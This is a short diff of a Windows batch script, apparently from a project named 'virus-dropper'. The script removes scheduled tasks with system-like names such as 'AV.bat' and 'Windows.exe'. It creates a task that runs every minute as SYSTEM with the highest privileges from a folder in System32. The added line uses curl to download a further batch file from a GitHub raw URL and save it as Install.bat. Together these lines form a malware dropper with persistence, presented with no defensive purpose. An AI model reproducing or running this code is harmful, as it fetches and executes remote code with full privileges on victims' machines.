@@ -18,5 +18,6 @@ powershell -Command "Unregister-ScheduledTask -TaskName 'Windows.exe' -Confirm:$
 powershell -Command "Unregister-ScheduledTask -TaskName 'AV.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'Update.bat' -Confirm:$false"
 powershell -Command "Unregister-ScheduledTask -TaskName 'uninstallTEMP' -Confirm:$false"
-SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\install.bat" /TN "installTEMP" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\Install.bat" /TN "installTEMP" /RL HIGHEST /RU SYSTEM
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/withoutRICKROLL.bat" --output "Install.bat"
 exit
